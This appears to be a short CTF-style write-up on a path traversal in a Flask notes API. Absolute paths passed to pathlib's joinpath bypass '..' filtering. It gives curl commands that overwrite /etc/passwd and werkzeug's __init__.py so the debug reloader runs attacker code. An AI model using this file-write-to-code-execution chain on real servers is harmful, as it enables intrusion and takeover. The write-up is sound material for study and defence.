If we control an argument in a call to `pathlib.Path.joinpath` we can make the function
returns an arbitrary path, even when ".." is filtered:
```sh
>>> Path("/app/notes").joinpath("/etc/passwd")
PosixPath('/etc/passwd')
>>> Path("/app/notes", "/etc/passwd")
PosixPath('/etc/passwd')
```

We have an arbitrary file write.
```sh
$ curl http://0:5000/api/notes/3c12f410-cdb3-4422-bf9c-b9f9f79ab7e7 -F /etc/passwd=@new_passwd
```
This will overwrite the server's `/etc/passwd` with our local file `new_passwd`.

The Flask server has been started in debug mode, but unfortunately the source code is owned by root and we can't overwrite it to execute arbitrary Python code.  
Flask hot reloading is backed by Werkzeug. Werkzeug watches for all source code files of loaded modules and reload the web server if any of them were updated. (See https://github.com/pallets/werkzeug/blob/09ddd52f97a5dc079fb666323638c183379b1c90/src/werkzeug/_reloader.py#L43)

So we can overwrite the local Python repository, owned by our user to execute arbitrary Python code:
```sh
$ curl http://0:5000/api/session
"3c12f410-cdb3-4422-bf9c-b9f9f79ab7e7"
$ curl http://0:5000/api/notes/3c12f410-cdb3-4422-bf9c-b9f9f79ab7e7 -F /home/user/.local/lib/python3.12/site-packages/werkzeug/__init__.py=@pld.py
```

It also works with `os.path.join` and even `std::path::Path::join` in Rust.
